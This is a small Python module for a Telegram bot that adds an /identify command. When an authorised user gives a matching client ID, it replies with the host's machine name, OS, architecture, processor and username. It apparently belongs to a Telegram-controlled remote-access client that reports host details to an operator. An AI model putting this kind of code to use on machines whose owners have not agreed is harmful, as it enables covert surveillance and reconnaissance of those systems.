from telegram.ext import CommandHandler

passedCtx = None

def run(ctx):
    global passedCtx  # <-- this was missing!
    passedCtx = ctx
    ctx["app"].add_handler(CommandHandler("identify", identify))

async def identify(update, context):
    if not passedCtx["auth"].CheckAuth(update.message.from_user.username):
        print(f"Unauthorized access attempt by {update.message.from_user.username}")
        return

    if not context.args:
        await update.message.reply_text("Usage: /identify <client_id>")
        return
    
    if context.args[0] != passedCtx["info"].ReturnClientID():
        print("Not the same client ID")
        return

    IDENTIFIERS = passedCtx["info"].GetUniqueIdentifiers()
    response = (
        f"Current identifiers:\n"
        f"Machine Name: {IDENTIFIERS['MachineName']}\n"
        f"OS: {IDENTIFIERS['OS']} {IDENTIFIERS['OSVersion']} ({IDENTIFIERS['Architecture']})\n"
        f"Processor: {IDENTIFIERS['Processor']}\n"
        f"Username: {IDENTIFIERS['Username']}"
    )
    await update.message.reply_text(response)
